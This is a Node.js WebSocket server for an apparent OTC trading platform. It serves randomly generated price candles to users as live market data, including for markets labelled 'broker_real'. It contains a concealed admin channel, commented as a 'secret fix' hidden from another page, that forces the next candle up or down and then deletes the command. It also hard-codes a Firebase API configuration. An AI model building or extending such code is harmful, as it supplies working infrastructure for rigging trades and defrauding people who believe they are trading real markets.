// --- START OF FILE server.js ---
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const TIMEFRAME = 60000; 
const TICK_MS = 300; 
const MAX_LOCAL_CANDLES = 120; 

const markets = {}; 
const adminSignals = {}; // 🔥 New Secret Storage for Commands 🔥

function roundPrice(v) { return parseFloat(v.toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// 1. Listen for Markets
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const market = fbMarkets[marketId];
        if (market.status === 'active' && (market.type === 'otc' || market.type === 'broker_real')) {
            if (!markets[marketId]) {
                initializeNewMarket(marketId, market.name);
            }
        }
    });
});

// 2. 🔥 THE SECRET FIX: Listen to a new path that v4.html doesn't know about 🔥
db.ref('admin/market_signals').on('value', (snapshot) => {
    const signals = snapshot.val() || {};
    Object.keys(signals).forEach(marketId => {
        adminSignals[marketId] = signals[marketId];
    });
});

async function initializeNewMarket(marketId, marketName) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15500; 
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.exists() && liveSnap.val().price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = 60; i > 0; i--) {
        const c = buildCandle(nowPeriod - (i * TIMEFRAME), currentPrice, Math.random() > 0.5 ? 'UP' : 'DOWN', false);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice };
}

function buildCandle(timestamp, open, direction, isForced = false) {
    // If Admin forced it, make the body slightly bigger and clear so it's obvious
    const baseVolatility = open * (0.0001 + Math.random() * 0.0003);
    const bodySize = isForced ? baseVolatility * 1.5 : baseVolatility * (0.3 + Math.random() * 0.7);
    const upperWick = baseVolatility * 0.3;
    const lowerWick = baseVolatility * 0.3;

    let close, high, low;

    if (direction === 'UP') {
        close = open + bodySize; // Green Candle
        high = close + upperWick;
        low = open - lowerWick;
    } else { // DOWN
        close = open - bodySize; // Red Candle
        high = open + upperWick;
        low = close - lowerWick;
    }

    return { timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close) };
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        const signal = adminSignals[marketData.marketId];

        // 🔥 CHECK SECRET ADMIN COMMAND 🔥
        if (signal && signal.type && (signal.type === 'UP' || signal.type === 'DOWN')) {
            console.log(`✅ [ADMIN SIGNAL EXECUTED] Market: ${marketData.marketId} | Direction: ${signal.type}`);
            newCandle = buildCandle(currentPeriod, lastCandle.close, signal.type, true);
            
            // Delete the command from Firebase after executing
            db.ref(`admin/market_signals/${marketData.marketId}`).remove();
            delete adminSignals[marketData.marketId];
        } 
        else {
            // Random Candle
            newCandle = buildCandle(currentPeriod, lastCandle.close, Math.random() > 0.5 ? 'UP' : 'DOWN', false);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_LOCAL_CANDLES) marketData.history.shift();

        // Backup to Firebase
        db.ref(`markets/${marketData.marketPath}/candles/60s/${lastCandle.timestamp}`).set(lastCandle).catch(()=>{});
        db.ref(`markets/${marketData.marketPath}/live`).set({ price: lastCandle.close, timestamp: lastCandle.timestamp }).catch(()=>{});

        return newCandle;
    }
    return lastCandle;
}

function updateRealisticPrice(marketData, candle) {
    if (Math.random() < 0.3) return; 
    const pull = (candle.close - marketData.currentPrice) * 0.15; // Pull towards target close
    const noise = (Math.random() - 0.5) * (candle.open * 0.00008);
    marketData.currentPrice += (pull + noise);
    marketData.currentPrice = Math.max(candle.low, Math.min(candle.high, marketData.currentPrice));
    candle.currentLivePrice = roundPrice(marketData.currentPrice);
}

function broadcastCandle(marketId, candle) {
    const liveCandle = { ...candle, close: candle.currentLivePrice || candle.close };
    const payload = JSON.stringify({ type: 'subscribed', market: marketId, candle: liveCandle });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg.type === 'subscribe') ws.subscribedMarket = msg.market;
        } catch (_) {}
    });
});

setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;
        updateRealisticPrice(marketData, candle);
        broadcastCandle(marketId, candle);
    }
}, TICK_MS);

// Auto Storage Cleanup (Keeps Firebase from getting full)
setInterval(() => {
    const twoHoursAgo = Date.now() - (2 * 60 * 60 * 1000);
    Object.keys(markets).forEach(marketId => {
        const ref = db.ref(`markets/${markets[marketId].marketPath}/candles/60s`);
        ref.orderByKey().endAt(String(twoHoursAgo)).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const updates = {};
                snapshot.forEach(child => { updates[child.key] = null; });
                ref.update(updates);
            }
        });
    });
}, 30 * 60 * 1000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server Running on PORT ${PORT}`));
// --- END OF FILE ---